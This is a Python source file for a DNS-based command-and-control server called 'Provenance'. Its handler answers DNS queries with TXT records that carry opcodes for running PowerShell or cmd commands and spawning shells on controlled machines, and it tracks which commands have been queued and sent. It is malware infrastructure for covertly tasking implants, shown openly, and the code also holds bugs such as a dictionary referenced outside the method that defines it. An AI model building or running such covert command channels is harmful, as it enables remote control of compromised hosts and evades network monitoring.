import dnslib
from socketserver import UDPServer, BaseRequestHandler
import threading

class IndividualClientHandler(BaseRequestHandler):
    """ This represents a machine being controlled by Provenance"""

    """ Builtin Functions"""
    def __init__(self, request, client_address, server, rrtype="TXT", name=None):
        # Superclass initialization
        self.server = server
        self.request = request
        self.client_address = client_address

        # Subclass Initialization
        self.name = name
        self.ip = client_address[0]
        self.active = False
        self.record_type = "TXT"
        self.last_request_id = None
        self.queued_commands = [("POWERSHELL_EXECUTE", "ls")]
        self.sent_commands = []
    
    def __repr__(self):
        return f"{self.name}{{{self.ip}, {self.record_type}}}"

    """ Subclass Functions"""
    def handle(self):
        data = self.get_data()
        request = dnslib.DNSRecord.parse(data)
        # Check IDs for repeat numbers, ignore if processed
        if not self.last_request_id == request.header.id:
            print(request)
            self.last_request_id = request.header.id
            self.send_cmd(request)

    def get_data(self):
        return self.request[0].strip()


    """ Provenance Specific Functions"""
    def queue_cmd(self, type, cmd):
        self.queued_commands.append((command_type[type], cmd))

    def send_cmd(self, request):
        RR = {
            "TXT": (dnslib.QTYPE.TXT, dnslib.TXT),
		}
        command_type = {
            "NONE": 0,
            "POWERSHELL_EXECUTE": 1,
            "CMD_EXECUTE" : 2,
            "SPAWN_SHELL": 3 
        }

        if self.queued_commands:
			# TODO: use dictionary switch to encode different packets
            opcode, cmd = self.queued_commands.pop()
        else:
            opcode, cmd = ("NONE", "NONE")

        rr_type, rr_constructor  = RR[self.record_type]
        # Generate skeleton question for packet
        command_packet = request.reply() 
        # Generate the response to the question
        command_packet.add_answer(
            dnslib.RR(
                rname="fakedomain.com",
				rtype=rr_type,
                rclass=dnslib.CLASS.IN,
				rdata=rr_constructor(f"<{command_type[opcode]}>:{cmd}"),
                ttl=1337))
        # send command
        socket = self.request[1]
        print(f"[INFO] Sending command to {self.client_address}")
        print(f"{command_packet.pack()}")
        socket.sendto(command_packet.pack(), self.client_address)
        self.sent_commands.append((request.header.id,cmd))

